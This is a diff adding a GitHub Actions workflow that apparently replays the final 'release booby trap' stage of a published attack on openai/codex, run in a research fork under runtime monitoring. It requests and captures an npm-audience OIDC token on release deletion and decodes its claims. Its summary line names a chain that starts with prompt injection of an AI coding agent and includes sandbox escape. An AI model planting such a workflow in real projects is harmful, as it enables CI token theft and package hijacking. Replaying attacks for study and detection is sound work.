@@ -1,0 +1,64 @@
+# Garnet Depi Replay — STAGE 4 (terminal)
+#
+# The "Release Booby Trap" of the Depi openai/codex chain
+# (https://depi.security/blog/20261111-backdooring-codex/).
+#
+# The attacker's poisoned rust-ci test created a fake release and planted a
+# workflow with `on: {release: {types: [edited, deleted]}}` and
+# `permissions: {id-token: write, ...}`. When a developer deletes the rogue
+# release, this workflow fires with the OpenID Connect permission — and the
+# OIDC token it can request is the artifact npm's trust policy accepts for
+# publishing @openai/codex.
+#
+# In the article the planted workflow just ran `echo pwned`; the token
+# request happens because the job carries id-token: write. This replay makes
+# that request explicit: it captures the JWT (audience npm) and stops. This
+# fork has no npm OIDC trust policy, so there is nothing to publish with —
+# the chain demonstrably ends here, which is the point.
+#
+# Note: `on: release` events run the workflow from the repository's default
+# branch, so this file takes effect once the replay harness PR is merged.
+
+name: "Release Booby Trap (Depi replay)"
+
+on:
+  release:
+    types: [edited, deleted]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  fire:
+    name: "booby trap fired"
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - name: Garnet Runtime Review
+        uses: garnet-org/action@673a06d87748bec49e4d8df22d371b2a3420aba4 # v2.5.2
+        with:
+          api_token: ${{ secrets.GARNET_API_TOKEN }}
+          show_detections: "true"
+
+      - name: "request the OIDC token (attack's terminal objective)"
+        run: |
+          set -euo pipefail
+          echo "release event: ${{ github.event.action }} — booby trap fired"
+          # The request the attacker's publish step would make. The JWT is
+          # what npm's trust policy would exchange for a package publish.
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm" | jq -r .value > jwt.txt
+          echo "OIDC JWT captured: $(wc -c < jwt.txt) bytes"
+          # Show the claims (not the signature) so the evidence is readable.
+          python3 - << 'PY'
+          import base64, json
+          def dec(s):
+              s += "=" * (-len(s) % 4)
+              return json.loads(base64.urlsafe_b64decode(s))
+          parts = open("jwt.txt").read().strip().split(".")
+          print("header :", json.dumps(dec(parts[0]), indent=2))
+          print("claims :", json.dumps(dec(parts[1]), indent=2))
+          PY
+          echo "=== chain complete: prompt injection -> sandbox escape -> token theft ->"
+          echo "=== cache poison -> rust-ci execution -> fake release -> release deletion -> OIDC"
